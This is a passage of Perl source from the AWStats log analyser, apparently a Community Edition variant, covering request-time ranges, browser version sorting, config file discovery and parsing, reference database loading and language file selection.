# Note:         Zero/negative values map to '0-44'; values >5120 map to '5K+'
#------------------------------------------------------------------------------
sub GetRequestTimeRange {
	my $rqtime = shift;
	if ($Debug) { debug("GetRequestTimeRange rqtime=$rqtime ms", 4); }
	
	if ($rqtime <= 44)      { return $TimeRange[0]; }
	if ($rqtime <= 100)     { return $TimeRange[1]; }
	if ($rqtime <= 500)     { return $TimeRange[2]; }
	if ($rqtime <= 1024)    { return $TimeRange[3]; }
	if ($rqtime <= 2048)    { return $TimeRange[4]; }
	if ($rqtime <= 5120)    { return $TimeRange[5]; }
	return $TimeRange[6];
}

#------------------------------------------------------------------------------
# Function:     Compare two browsers version
# Parameters:   $a, $b (special sorting variables)
# Input:        %BrowsersFamily
# Output:       None
# Return:       -1, 0, 1 (standard comparator return values)
#------------------------------------------------------------------------------
sub SortBrowsers {
	my $a_copy = $a;
	my $b_copy = $b;
	
	my $a_family = $a_copy;
	my @a_ver    = ();
	foreach my $family ( keys %BrowsersFamily ) {
		if ( $a_copy =~ /^$family/i ) {
			$a_copy =~ m/^(\D+)([\d\.]+)?$/;
			$a_family = $1;
			@a_ver = split( /\./, $2 ) if defined $2;
			last;
		}
	}
	
	my $b_family = $b_copy;
	my @b_ver    = ();
	foreach my $family ( keys %BrowsersFamily ) {
		if ( $b_copy =~ /^$family/i ) {
			$b_copy =~ m/^(\D+)([\d\.]+)?$/;
			$b_family = $1;
			@b_ver = split( /\./, $2 ) if defined $2;
			last;
		}
	}

	my $compare = $a_family cmp $b_family;
	if ( $compare != 0 ) {
		return $compare;
	}

	my $done = 0;
	while ( !$done ) {
		my $a_num = shift @a_ver || 0;
		my $b_num = shift @b_ver || 0;

		$compare = $a_num <=> $b_num;
		if ( $compare != 0
			|| ( scalar(@a_ver) == 0 && scalar(@b_ver) == 0 && $compare == 0 ) )
		{
			$done = 1;
		}
	}

	return $compare;
}

#------------------------------------------------------------------------------
# Function:     Read config file and apply defaults
# Description:  - Searches OS-specific directories for config files
#               - Supports $PROG.$SiteConfig.conf, $PROG.conf, or literal $SiteConfig
#               - Custom $configdir allowed only with AWSTATS_ENABLE_CONFIG_DIR in CGI
#               - Calls Parse_Config() to load settings
#               - Initializes missing parameters: NotPageList, ValidHTTPCodes,
#                 ValidSMTPCodes, TrapInfosForHTTPErrorCodes
#               - Auto-enables geoipfree and localdate plugins (Community Edition)
# Parameters:   $configdir - Optional custom directory (security enforced)
# Input:        $DIR, $PROG, $SiteConfig
# Output:       Global configuration variables, $FileConfig, $FileSuffix
# Return:       None (exits on error)
#------------------------------------------------------------------------------
sub Read_Config {
	# Check config file in common possible directories :
	# Windows :                   				"$DIR" (same dir than awstats.pl)
	# Standard, Mandrake and Debian package :	"/etc/awstats"
	# Other possible directories :				"/usr/local/etc/awstats",
	# FHS standard, Suse package : 				"/etc/opt/awstats"
	my $configdir = shift;
	# my $UseDefaultNotPageList = 0;
	my @PossibleConfigDir;
	my $os_name = $^O;
	
	if ($os_name =~ /MSWin32|Windows|cygwin/i) {
		@PossibleConfigDir = ("$DIR");
		if ($Debug) {
			debug("Windows OS detected, searching config only in: $DIR", 2);
		}
	} else {
		@PossibleConfigDir = (
			"/home/awstats",
			"/etc/awstats",
			"/usr/local/etc/awstats",
			"/etc/opt/awstats"
		);
		if ($Debug) {
			debug("Unix/Linux OS detected, searching config in standard directories", 2);
		}
	}

	if ($configdir) {
		# Check if configdir is outside default values.
		my $outsidedefaultvalue=1;
		foreach (@PossibleConfigDir) {
			if ($_ eq $configdir) { $outsidedefaultvalue=0; last; }
		}

		# If from CGI, overwriting of configdir with a value that differs from a default value
		# is only possible if AWSTATS_ENABLE_CONFIG_DIR defined.
		# AWSTATS_ENABLE_CONFIG_DIR must contains dir allowed
		if ($ENV{'GATEWAY_INTERFACE'} && $outsidedefaultvalue) {
			if (! $ENV{"AWSTATS_ENABLE_CONFIG_DIR"}) {
				error("Sorry, to allow overwriting of configdir parameter, from an AWStats CGI page, with a non default value, environment variable AWSTATS_ENABLE_CONFIG_DIR must be set to full path of allowed directory. For example, by adding the line 'SetEnv AWSTATS_ENABLE_CONFIG_DIR /mydirofconf' in your Apache config file or into a .htaccess file.");
			}
			else {
				if ($configdir !~ $ENV{"AWSTATS_ENABLE_CONFIG_DIR"}) {
					error("Sorry, using configdir parameter from an AWStats CGI page is possible only if parameter configdir is a directory defined into environment variable AWSTATS_ENABLE_CONFIG_DIR");
				}
			}
		}

		@PossibleConfigDir = ("$configdir");
	}

	# Open config file
	$FileConfig = $FileSuffix = '';
	foreach (@PossibleConfigDir) {
		my $searchdir = $_;
		if ( $searchdir && $searchdir !~ /[\\\/]$/ ) { $searchdir .= "/"; }
		
		if ( -f $searchdir.$PROG.".".$SiteConfig.".conf" &&  open( CONFIG, "<$searchdir$PROG.$SiteConfig.conf" ) ) {
			$FileConfig = "$searchdir$PROG.$SiteConfig.conf";
			$FileSuffix = ".$SiteConfig";
			if ($Debug){debug("Opened config: $searchdir$PROG.$SiteConfig.conf", 2);}
			last;
		}else{if ($Debug){debug("Unable to open config file: $searchdir$PROG.$SiteConfig.conf", 2);}}
		
		if ( -f $searchdir.$PROG.".conf" &&  open( CONFIG, "$searchdir$PROG.conf" ) ) {
			$FileConfig = "$searchdir$PROG.conf";
			$FileSuffix = '';
			if ($Debug){debug("Opened config: $searchdir$PROG.conf", 2);}
			last;
		}else{if ($Debug){debug("Unable to open config file: $searchdir$PROG.conf", 2);}}
		
		# Added to open config if file name is passed to awstats 
		if ( -f $searchdir.$SiteConfig && open( CONFIG, "$searchdir$SiteConfig" ) ) {
			$FileConfig = "$searchdir$SiteConfig";
			$FileSuffix = '';
			if ($Debug){debug("Opened config: $searchdir$SiteConfig", 2);}
			last;
		}else{if ($Debug){debug("Unable to open config file: $searchdir$SiteConfig", 2);}}
	}

	if ( !$FileConfig ) {
		if ($DEBUGFORCED || !$ENV{'GATEWAY_INTERFACE'}){
			error( "Couldn't open config file \"$PROG.$SiteConfig.conf\", nor \"$PROG.conf\", nor \"$SiteConfig\" after searching in path \""
				  . join( ', ', @PossibleConfigDir )
				  . ", $SiteConfig\": $!" );
		} else {
			&Read_Language_Data($Lang);
			error( _t("Domain name in browser address appears to be missing or incomplete") . ": \"$PROG.$SiteConfig\".\n"
				. _t("Please check the URL parameter") . " '?config=" . $SiteConfig . "'." );
		}
	}

	# Analyze config file content and close it
	&Parse_Config( *CONFIG, 1, $FileConfig );
	close CONFIG;

	# If parameter NotPageList not found, init for backward compatibility
	if ($Debug) {
		debug("UseDefaultNotPageList value: $UseDefaultNotPageList", 2);
		debug("FoundNotPageList value: $FoundNotPageList", 2);
	}

	# If parameter NotPageList not found, init for backward compatibility
	if ( !$FoundNotPageList || $UseDefaultNotPageList ) {
		if ($Debug) {
			debug("Using built-in default NotPageList (Reason: FoundNotPageList=$FoundNotPageList, UseDefaultNotPageList=$UseDefaultNotPageList)", 2);
		}
		%NotPageList = map { $_ => 1 } qw(
			gif jpg jpeg png bmp ico svg webp avif heic
			css scss sass less js mjs cjs jsx ts tsx map
			eot ttf otf woff woff2
			mp4 webm mkv avi mov flv mp3 m4a ogg wav flac
			class rss xml swf pdf json
		);
	} else {
		if ($Debug) {
			debug("Using NotPageList from config file", 2);
		}
	}

	# If parameter ValidHTTPCodes empty, init for backward compatibility
	if ( !scalar keys %ValidHTTPCodes ) {
		$ValidHTTPCodes{"200"} = $ValidHTTPCodes{"304"} = 1;
	}

	# If parameter ValidSMTPCodes empty, init for backward compatibility
	if ( !scalar keys %ValidSMTPCodes ) {
		$ValidSMTPCodes{"1"} = $ValidSMTPCodes{"250"} = 1;
	}

	# If parameter TrapInfosForHTTPErrorCodes empty, init to default
	if ( !scalar keys %TrapInfosForHTTPErrorCodes ) {
		$TrapInfosForHTTPErrorCodes{"404"} = 1;
	}
	# Community Edition default enables geoipfree plugin and localdate plugin
	my $has_geoip = 0;
	foreach my $plugin (@PluginsToLoad) {
		if ($plugin =~ /geoip/) {
			$has_geoip = 1;
			last;
		}
	}
	
	if (!$has_geoip) {
		push @PluginsToLoad, "geoipfree";
		if ($Debug) {
			debug("Community Edition: The geoipfree plugin is enabled by default (when no other geoip plugins are present)");
		}
	}
	my $has_localdate = 0;
	foreach my $plugin (@PluginsToLoad) {
		if ($plugin =~ /localdate/) {
			$has_localdate = 1;
			last;
		}
	}
	if (!$has_localdate && $EnableLocaldatePlugin) {
		push @PluginsToLoad, "localdate";
		if ($Debug) {
			debug("Community Edition: The localdate plugin is enabled by default (for calendar localization)");
		}
	}
}

#------------------------------------------------------------------------------
# Function:     Parse AWStats configuration file (supports includes)
# Description:  Reads key=value pairs from config file and sets corresponding
#               global variables. Handles:
#               - Include directives with __ENV__ substitution
#               - REGEX[...] patterns → compiled regex
#               - @filename syntax (read list from external file)
#               - ExtraSection parameters, LoadPlugin (with sanitization)
#               - Dynamic variable creation via eval
# Parameters:   $confighandle - Open file handle
#               $level        - Nesting depth (prevents infinite loops)
#               $configFile   - Path (for error messages)
# Output:       Global configuration variables (e.g., $LogFile, @SkipHosts, ...)
# Return:       None (exits on error)
#------------------------------------------------------------------------------
sub Parse_Config {
	my ($confighandle) = $_[0];
	my $level          = $_[1];
	my $configFile     = $_[2];
	my $versionnum     = 0;
	my $conflinenb     = 0;

	if ( $level > 10 ) {
		error( "$PROG can't read down more than 10 level of includes. Check that no 'included' config files include their parent config file (this cause infinite loop)."
		);
	}

	while (<$confighandle>) {
		chomp $_;
		s/\r//;
		$conflinenb++;

		# Extract version from first line
		if ( !$versionnum && $_ =~ /^# AWSTATS CONFIGURE FILE (\d+).(\d+)/i ) {
			$versionnum = ( $1 * 1000 ) + $2;

			#if ($Debug) { debug(" Configure file version is $versionnum",1); }
			next;
		}

		if ( $_ =~ /^\s*$/ ) { next; }

		# Check includes
		#include kept for backward compatibility
		if ( $_ =~ /^Include "([^\"]+)"/ || $_ =~ /^#include "([^\"]+)"/ )
		{
			my $includeFile = $1;

			# Expand __var__ by values
			while ( $includeFile =~ /__([^\s_]+(?:_[^\s_]+)*)__/ ) {
				my $var = $1;
				$includeFile =~ s/__${var}__/$ENV{$var}/g;
			}
			if ($Debug) { debug( "Found an include : $includeFile", 2 ); }
			if ( $includeFile !~ /^([a-zA-Z]:)?[\\\/]/ ) {
				# Correct relative include files
				if ( $FileConfig =~ /^(.*[\\\/])[^\\\/]*$/ ) {
					$includeFile = "$1$includeFile";
				}
			}
			if ( $level > 1 && $^V lt v5.6.0 ) {
				warning( "Warning: Perl versions before 5.6 cannot handle nested includes"
				);
				next;
			}
			local( *CONFIG_INCLUDE );   # To avoid having parent file closed when include file is closed
			if ( open( CONFIG_INCLUDE, "<$includeFile" ) ) {
				&Parse_Config( *CONFIG_INCLUDE, $level + 1, $includeFile );
				close(CONFIG_INCLUDE);
			}
			else {
				error("Could not open include file: $includeFile");
			}
			next;
		}

		# Remove comments
		if ( $_ =~ /^\s*#/ ) { next; }
		$_ =~ s/\s#.*$//;

		# Extract param and value
		my ( $param, $value ) = split( /=/, $_, 2 );
		$param =~ s/^\s+//;
		$param =~ s/\s+$//;

		# If not a param=value, try with next line
		if ( !$param ) {
			warning( "Warning: Syntax error line $conflinenb in file '$configFile'. Config line is ignored."
			);
			next;
		}
		if ( !defined $value ) {
			warning( "Warning: Syntax error line $conflinenb in file '$configFile'. Config line is ignored."
			);
			next;
		}

		if ($value) {
			$value =~ s/^\s+//;
			$value =~ s/\s+$//;
			$value =~ s/^\"//;
			$value =~ s/\";?$//;

			# Replace __MONENV__ with value of environnement variable MONENV
			# Must be able to replace __VAR_1____VAR_2__
			while ( $value =~ /__([^\s_]+(?:_[^\s_]+)*)__/ ) {
				my $var = $1;
				$value =~ s/__${var}__/$ENV{$var}/g;
			}
		}

		# Initialize parameter for (param,value)
		if ( $param =~ /^LogFile/ ) {
			if ( $QueryString !~ /logfile=([^\s&]+)/i ) { $LogFile = $value; }
			next;
		}
		if ( $param =~ /^DirIcons/ ) {
			if ( $QueryString !~ /diricons=([^\s&]+)/i ) { $DirIcons = $value; }
			next;
		}
		if ( $param =~ /^SiteDomain/ ) {

			# No regex test as SiteDomain is always exact value
			$SiteDomain = $value;

  			if ($SiteDomain =~ m/xn--/) 
  			{
				# TODO Add code to test if IDNA::Punycode module is on
				#use IDNA::Punycode;
				$DecodePunycode=0;	# Set to 1 if module is on	
  				if ($DecodePunycode)
  				{
					idn_prefix(undef);
					my @parts = split(/\./, $SiteDomain);
					foreach (@parts) {
						if ($_ =~ s/^xn--//) {
							eval { $_ = decode_punycode($_); };
							if (my $e = $@) { $_ = $e; }
						}
					}
					$SiteDomain = join('.', @parts);
  				}
			}
									
			next;
		}
		# No regex test as AddLinkToExternalCGIWrapper is always exact value
		if ( $param =~ /^AddLinkToExternalCGIWrapper/ ) {
			$AddLinkToExternalCGIWrapper = $value;
			next;
		}
		if ( $param =~ /^BrandLink$/i ) {
			$BrandLink = $value;
			next;
		}
		if ( $param =~ /^BrandPlatform$/i ) {
			$BrandPlatform = $value;
			next;
		}
		if ( $param =~ /^StatsUrl$/i ) {
			$StatsUrl = $value;
			next;
		}
		if ( $param =~ /^HostAliases/ ) {
			@HostAliases = ();
			if ( $value !~ /\S/ ) {
				next;
			}
			# If list of hostaliases in a file
			foreach my $elem ( split( /\s+/, $value ) ) {
				next if $elem eq '';
				if ( $elem =~ s/^\@// ) {
					open( DATAFILE, "<$elem" ) || error( "Failed to open file '$elem' declared in HostAliases parameter"
					);
					my @val = map( /^(.*)$/i, <DATAFILE> );
					push @HostAliases, map { qr/^$_$/i } @val;
					close(DATAFILE);
				}
				else {
					if ( $elem =~ /^REGEX\[(.*)\]$/i ) { $elem = $1; }
					else { $elem = '^' . quotemeta($elem) . '$'; }
					if ($elem) { push @HostAliases, qr/$elem/i; }
				}
			}
			next;
		}

		# Special optional setup params
		if ( $param =~ /^SkipDNSLookupFor/ ) {
			@SkipDNSLookupFor = ();
			foreach my $elem ( split( /\s+/, $value ) ) {
				if ( $elem =~ /^REGEX\[(.*)\]$/i ) { $elem = $1; }
				else { $elem = '^' . quotemeta($elem) . '$'; }
				if ($elem) { push @SkipDNSLookupFor, qr/$elem/i; }
			}
			next;
		}
		if ( $param =~ /^AllowAccessFromWebToFollowingAuthenticatedUsers/ ) {
			@AllowAccessFromWebToFollowingAuthenticatedUsers = ();
			foreach ( split( /\s+/, $value ) ) {
				push @AllowAccessFromWebToFollowingAuthenticatedUsers, $_;
			}
			next;
		}
		if ( $param =~ /^DefaultFile/ ) {
			@DefaultFile = ();
			foreach my $elem ( split( /\s+/, $value ) ) {

				# No REGEX for this option
				#if ($elem =~ /^REGEX\[(.*)\]$/i) { $elem=$1; }
				#else { $elem='^'.quotemeta($elem).'$'; }
				if ($elem) { push @DefaultFile, $elem; }
			}
			next;
		}
		if ( $param =~ /^SkipHosts/ ) {
			@SkipHosts = ();
			foreach my $elem ( split( /\s+/, $value ) ) {
				if ( $elem =~ /^REGEX\[(.*)\]$/i ) { $elem = $1; }
				else { $elem = '^' . quotemeta($elem) . '$'; }
				if ($elem) { push @SkipHosts, qr/$elem/i; }
			}
			next;
		}
		if ( $param =~ /^SkipReferrersBlackList/ && $value ) {
			open( BLACKLIST, "<$value" ) || die "Failed to open blacklist: $!\n";
			while (<BLACKLIST>) {
				chomp;
				my $elem = $_;
				$elem =~ s/ //;
				$elem =~ s/\#.*//;
				if ($elem) { push @SkipReferrers, qr/$elem/i; }
			}
			next;
			close(BLACKLIST);
		}
		if ( $param =~ /^SkipUserAgents/ ) {
			@SkipUserAgents = ();
			foreach my $elem ( split( /\s+/, $value ) ) {
				if ( $elem =~ /^REGEX\[(.*)\]$/i ) { $elem = $1; }
				else { $elem = '^' . quotemeta($elem) . '$'; }
				if ($elem) { push @SkipUserAgents, qr/$elem/i; }
			}
			next;
		}
		if ( $param =~ /^SkipFiles/ ) {
			@SkipFiles = ();
			foreach my $elem ( split( /\s+/, $value ) ) {
				if ( $elem =~ /^REGEX\[(.*)\]$/i ) { $elem = $1; }
				else { $elem = '^' . quotemeta($elem) . '$'; }
				if ($elem) { push @SkipFiles, qr/$elem/i; }
			}
			next;
		}
		if ( $param =~ /^OnlyHosts/ ) {
			@OnlyHosts = ();
			foreach my $elem ( split( /\s+/, $value ) ) {
				if ( $elem =~ /^REGEX\[(.*)\]$/i ) { $elem = $1; }
				else { $elem = '^' . quotemeta($elem) . '$'; }
				if ($elem) { push @OnlyHosts, qr/$elem/i; }
			}
			next;
		}
		if ( $param =~ /^OnlyUsers/ ) {
			@OnlyUsers = ();
			foreach my $elem ( split( /\s+/, $value ) ) {
				if ( $elem =~ /^REGEX\[(.*)\]$/i ) { $elem = $1; }
				else { $elem = '^' . quotemeta($elem) . '$'; }
				if ($elem) { push @OnlyUsers, qr/$elem/i; }
			}
			next;
		}
		if ( $param =~ /^OnlyUserAgents/ ) {
			@OnlyUserAgents = ();
			foreach my $elem ( split( /\s+/, $value ) ) {
				if ( $elem =~ /^REGEX\[(.*)\]$/i ) { $elem = $1; }
				else { $elem = '^' . quotemeta($elem) . '$'; }
				if ($elem) { push @OnlyUserAgents, qr/$elem/i; }
			}
			next;
		}
		if ( $param =~ /^OnlyFiles/ ) {
			@OnlyFiles = ();
			foreach my $elem ( split( /\s+/, $value ) ) {
				if ( $elem =~ /^REGEX\[(.*)\]$/i ) { $elem = $1; }
				else { $elem = '^' . quotemeta($elem) . '$'; }
				if ($elem) { push @OnlyFiles, qr/$elem/i; }
			}
			next;
		}
		if ( $param =~ /^NotPageFiles/ ) {
			@NotPageFiles = ();
			foreach my $elem ( split( /\s+/, $value ) ) {
				if ( $elem =~ /^REGEX\[(.*)\]$/i ) { $elem = $1; }
				else { $elem = '^' . quotemeta($elem) . '$'; }
				if ($elem) { push @NotPageFiles, qr/$elem/i; }
			}
			next;
		}
		if ( $param =~ /^NotPageList/ ) {
			%NotPageList = ();
			foreach ( split( /\s+/, $value ) ) { $NotPageList{$_} = 1; }
			$FoundNotPageList = 1;
			next;
		}
		if ( $param =~ /^UseDefaultNotPageList/i ) {
			$UseDefaultNotPageList = $value;
			if ($Debug) {
				debug("UseDefaultNotPageList set to: $UseDefaultNotPageList", 2);
			}
			next;
		}
		if ( $param =~ /^ValidHTTPCodes/ ) {
			%ValidHTTPCodes = ();
			foreach ( split( /\s+/, $value ) ) { $ValidHTTPCodes{$_} = 1; }
			next;
		}
		if ( $param =~ /^ValidSMTPCodes/ ) {
			%ValidSMTPCodes = ();
			foreach ( split( /\s+/, $value ) ) { $ValidSMTPCodes{$_} = 1; }
			next;
		}
		if ( $param =~ /^TrapInfosForHTTPErrorCodes/ ) {
			%TrapInfosForHTTPErrorCodes = ();
			foreach ( split( /\s+/, $value ) ) { $TrapInfosForHTTPErrorCodes{$_} = 1; }
			next;
		}
		if ( $param =~ /^URLWithQueryWithOnlyFollowingParameters$/ ) {
			@URLWithQueryWithOnly = split( /\s+/, $value );
			next;
		}
		if ( $param =~ /^URLWithQueryWithoutFollowingParameters$/ ) {
			@URLWithQueryWithout = split( /\s+/, $value );
			next;
		}

		# Extra parameters
		if ( $param =~ /^ExtraSectionName(\d+)/ ) {
			$ExtraName[$1] = $value;
			next;
		}
		if ( $param =~ /^ExtraSectionCodeFilter(\d+)/ ) {
			@{ $ExtraCodeFilter[$1] } = split( /\s+/, $value );
			next;
		}
		if ( $param =~ /^ExtraSectionCondition(\d+)/ ) {
			$ExtraCondition[$1] = $value;
			next;
		}
		if ( $param =~ /^ExtraSectionStatTypes(\d+)/ ) {
			$ExtraStatTypes[$1] = $value;
			next;
		}
		if ( $param =~ /^ExtraSectionFirstColumnTitle(\d+)/ ) {
			$ExtraFirstColumnTitle[$1] = $value;
			next;
		}
		if ( $param =~ /^ExtraSectionFirstColumnValues(\d+)/ ) {
			$ExtraFirstColumnValues[$1] = $value;
			next;
		}
		if ( $param =~ /^ExtraSectionFirstColumnFunction(\d+)/ ) {
			$ExtraFirstColumnFunction[$1] = $value;
			next;
		}
		if ( $param =~ /^ExtraSectionFirstColumnFormat(\d+)/ ) {
			$ExtraFirstColumnFormat[$1] = $value;
			next;
		}
		if ( $param =~ /^ExtraSectionAddAverageRow(\d+)/ ) {
			$ExtraAddAverageRow[$1] = $value;
			next;
		}
		if ( $param =~ /^ExtraSectionAddSumRow(\d+)/ ) {
			$ExtraAddSumRow[$1] = $value;
			next;
		}
		if ( $param =~ /^MaxNbOfExtra(\d+)/ ) {
			$MaxNbOfExtra[$1] = $value;
			next;
		}
		if ( $param =~ /^MinHitExtra(\d+)/ ) {
			$MinHitExtra[$1] = $value;
			next;
		}

		# Plugins
		if ( $param =~ /^LoadPlugin/ ) {
			$value =~ s/[^a-zA-Z0-9_\/\.\+:=\?\s%\-]//g;		# Sanitize plugin name and string param because it is used later in an eval.
			push @PluginsToLoad, $value; next; 
		}
		# EnableLocaldatePlugin - 控制是否自动加载 localdate 插件（日历本地化）
		# 默认为 1（启用），设置为 0 可禁用自动加载
		if ( $param =~ /^EnableLocaldatePlugin/i ) {
			$EnableLocaldatePlugin = $value;
			next;
		}
	  	# Other parameter checks we need to put after MaxNbOfExtra and MinHitExtra
		if ( $param =~ /^MaxNbOf(\w+)/ ) { $MaxNbOf{$1} = $value; next; }
		if ( $param =~ /^MinHit(\w+)/ )  { $MinHit{$1}  = $value; next; }

		# Check if this is a known parameter
		#		if (! $ConfOk{$param}) { error("Unknown config parameter '$param' found line $conflinenb in file \"configFile\""); }
		# If parameters was not found previously, defined variable with name of param to value
		eval "\$$param = \$value;";
		}

	if ($Debug) {
		debug("Config file read was \"$configFile\" (level $level)");
	}
}

#------------------------------------------------------------------------------
# Function:     Load reference databases (browsers, OS, robots, search engines, etc.)
# Description:  - Searches $DIR/lib and /usr/share/awstats/lib for .pm files
#               - Adds directories to @INC and require()s the modules
#               - Runs sanity checks to ensure database consistency
#               - Warns if files are missing or rule counts mismatch
# Parameters:   List of base names (e.g., 'domains', 'browsers', 'robots')
# Input:        $DIR
# Output:       Global hash/array references (e.g., %OSHashLib, @BrowsersSearchIDOrder)
# Return:       None (exits on critical consistency errors)
#------------------------------------------------------------------------------
sub Read_Ref_Data {

	# Check lib files in common possible directories :
	# Windows and standard package:        		"$DIR/lib" (lib in same dir than awstats.pl)
	# Debian package:                    		"/usr/share/awstats/lib"
	my @PossibleLibDir = ( "$DIR/lib", "/usr/share/awstats/lib", "/usr/local/share/awstats/lib" );
	my %FilePath       = ();
	my %DirAddedInINC  = ();
	my @FileListToLoad = ();
	while ( my $file = shift ) { push @FileListToLoad, "$file.pm"; }
	if ($Debug) {
		debug( "Call to Read_Ref_Data with files to load: "
			  . ( join( ',', @FileListToLoad ) ) );
	}
	foreach my $file (@FileListToLoad) {
		foreach my $dir (@PossibleLibDir) {
			my $searchdir = $dir;
			if (   $searchdir
				&& ( !( $searchdir =~ /\/$/ ) )
				&& ( !( $searchdir =~ /\\$/ ) ) )
			{
				$searchdir .= "/";
			}
			# To not load twice same file in different path
			if ( !$FilePath{$file} )
			{
				if ( -s "${searchdir}${file}" ) {
					$FilePath{$file} = "${searchdir}${file}";
					if ($Debug) {
						debug( "Call to Read_Ref_Data [FilePath{$file}=\"$FilePath{$file}\"]"
						);
					}

					# Note: cygwin perl 5.8 need a push + require file
					if ( !$DirAddedInINC{"$dir"} ) {
						push @INC, "$dir";
						$DirAddedInINC{"$dir"} = 1;
					}
					my $loadret = require "$file";

				   #my $loadret=(require "$FilePath{$file}"||require "${file}");
				}
			}
		}
		if ( !$FilePath{$file} ) {
			my $filetext = $file;
			$filetext =~ s/\.pm$//;
			$filetext =~ s/_/ /g;
			warning( "Warning: Can't read file \"$file\" ($filetext detection will not work correctly).\nCheck if file is in \""
				  . ( $PossibleLibDir[0] )
				  . "\" directory and is readable." );
		}
	}

	# Sanity check (if loaded)
	if ( ( scalar keys %OSHashID )
		&& @OSSearchIDOrder != scalar keys %OSHashID )
	{
		error(  "Not same number of records of OSSearchIDOrder ("
			  . (@OSSearchIDOrder)
			  . " entries) and OSHashID ("
			  . ( scalar keys %OSHashID )
			  . " entries) in OS database. Check your file "
			  . $FilePath{"operating_systems.pm"} );
	}
	if (
		( scalar keys %SearchEnginesHashID )
		&& ( @SearchEnginesSearchIDOrder_list1 +
			@SearchEnginesSearchIDOrder_list2 +
			@SearchEnginesSearchIDOrder_listgen ) != scalar
		keys %SearchEnginesHashID
	  )
	{
		error( "Not same number of records of SearchEnginesSearchIDOrder_listx (total is "
			  . (
				@SearchEnginesSearchIDOrder_list1 +
				  @SearchEnginesSearchIDOrder_list2 +
				  @SearchEnginesSearchIDOrder_listgen
			  )
			  . " entries) and SearchEnginesHashID ("
			  . ( scalar keys %SearchEnginesHashID )
			  . " entries) in Search Engines database. Check your file "
			  . $FilePath{"search_engines.pm"}
			  . " is up to date."
		);
	}
	if ( 0 && ( scalar keys %BrowsersHashIDLib )
		&& @BrowsersSearchIDOrder != ( scalar keys %BrowsersHashIDLib ) - ( scalar keys %BrowsersFamily ) )
	{
		foreach (sort keys %BrowsersHashIDLib)
		{
			print $_."\n";
		}
		foreach (sort @BrowsersSearchIDOrder)
		{
			print $_."\n";
		}
		error(  "Not same number of records of BrowsersSearchIDOrder ("
			  . (@BrowsersSearchIDOrder)
			  . " entries) and BrowsersHashIDLib ("
			  . ( ( scalar keys %BrowsersHashIDLib ) - ( scalar keys %BrowsersFamily ) )
			  . " entries without firefox,opera,chrome,safari,konqueror,svn,msie,netscape,edge) in Browsers database. May be you updated AWStats without updating browsers.pm file or you made changed into browsers.pm not correctly. Check your file "
			  . $FilePath{"browsers.pm"}
			  . " is up to date." );
	}
	my $total_rules = ( @RobotsSearchIDOrder_list1 || 0 ) + 
					( @RobotsSearchIDOrder_list2 || 0 ) + 
					( @RobotsSearchIDOrder_listgen || 0 );
	my $expected_rules = ( scalar keys %RobotsHashIDLib ) - 1;

	if ( ( scalar keys %RobotsHashIDLib ) && $total_rules != $expected_rules )
	{
		if ($Debug) {
			debug("Robots database count mismatch: list1=" . (@RobotsSearchIDOrder_list1||0) . 
				" list2=" . (@RobotsSearchIDOrder_list2||0) . 
				" listgen=" . (@RobotsSearchIDOrder_listgen||0) . 
				" total=$total_rules, expected=$expected_rules, hash=" . (scalar keys %RobotsHashIDLib));
		}
		if ($total_rules > $expected_rules) {
			debug( "Robots database has $total_rules rules but only $expected_rules descriptions. " .
					"Some rules may be missing corresponding descriptions in %RobotsHashIDLib. " .
					"Check your file " . $FilePath{"robots.pm"} . " for consistency." );
		} elsif ($total_rules < $expected_rules) {
			debug( "Robots database has $total_rules rules but $expected_rules descriptions. " .
					"Some descriptions may be missing corresponding rules in \@RobotsSearchIDOrder. " .
					"Check your file " . $FilePath{"robots.pm"} . " for consistency." );
		}
	}
}

#------------------------------------------------------------------------------
# Function:     Load language data and set up translation environment
# Description:  - Resolves user's preferred language from:
#                 * HTTP Accept-Language header (BCP 47 tags, e.g., "zh-CN", "en-US") when $lang='auto'
#                 * Explicit $lang parameter (command line or URL)
#               - Maps BCP 47 tags to AWStats internal language codes via %LangBrowserToLangAwstats
#               - Searches multiple directories for awstats-<lang>.po file
#               - Falls back to English (en) if no matching .po file found
#               - Loads translations via parse_po_file() into %translate_map and $Message[]
#               - Sets $PageCode = 'utf-8' (always UTF-8)
#               - Sets $PageDir = 1 for RTL languages (ar, he, fa, ur, ug), 0 for LTR
#               - For mail logs (LogType='M'), adds special mappings: First, Last, Mails, Size
# Parameters:   $lang - Language code (e.g., 'en-us', 'zh-cn', or 'auto')
# Input:        $DirLang, $DIR, %LangBrowserToLangAwstats, $LogType
# Output:       %translate_map, $Message[], $PageCode, $PageDir
# Return:       None
#------------------------------------------------------------------------------
sub Read_Language_Data {
	my $lang = shift || 'en-us';
	my $or_lang = $lang;

	if ( $lang eq 'auto' && $ENV{'HTTP_ACCEPT_LANGUAGE'} ) {
		my @accept = split /,/, $ENV{'HTTP_ACCEPT_LANGUAGE'};
		foreach my $lang_pref (@accept) {
			$lang_pref =~ s/;.*//;
			$lang_pref =~ s/^\s+|\s+$//g;
			$lang_pref = lc($lang_pref);
			$lang_pref =~ s/_/-/g;
			
			if ( $LangBrowserToLangAwstats{$lang_pref} ) {
				$lang = $LangBrowserToLangAwstats{$lang_pref};
				last;
			}
			
			my $short = substr($lang_pref, 0, 2);
			if ( $LangBrowserToLangAwstats{$short} ) {
				$lang = $LangBrowserToLangAwstats{$short};
				last;
			}
		}
		
		if ( $lang eq 'auto' && $accept[0] ) {
			my $first = $accept[0];
			$first =~ s/;.*//;
			$first =~ s/^\s+|\s+$//g;
			$first = lc($first);
			$first =~ s/_/-/g;
			my $short = substr($first, 0, 2);
			if ( $LangBrowserToLangAwstats{$short} ) {
				$lang = $LangBrowserToLangAwstats{$short};
			}
		}
	}

	my @PossibleLangDir = ( "$DirLang", "$DIR/lang", "/usr/share/awstats/lang", "/usr/local/share/awstats/lang" );
	my $FileLang = '';
	
	foreach my $dir (@PossibleLangDir) {
		my $searchdir = $dir;
		
		if ( $searchdir =~ /\|/ ) {
			error("DirLang parameter can't contains character |");
			next;
		}
		
		if ( $searchdir && !( $searchdir =~ /\/$/ ) && !( $searchdir =~ /\\$/ ) ) {
			$searchdir .= "/";
		}
		
		my $pofile = "${searchdir}awstats-$lang.po";
		if ( -f $pofile ) {
			$FileLang = $pofile;
			last;
		}
		
		my $lang_underscore = $lang;
		$lang_underscore =~ s/-/_/g;
		if ( $lang_underscore ne $lang ) {
			$pofile = "${searchdir}awstats-${lang_underscore}.po";
			if ( -f $pofile ) {
				$FileLang = $pofile;
				last;
			}
		}
	}

	if ( !$FileLang ) {
		foreach my $dir (@PossibleLangDir) {
			my $searchdir = $dir;
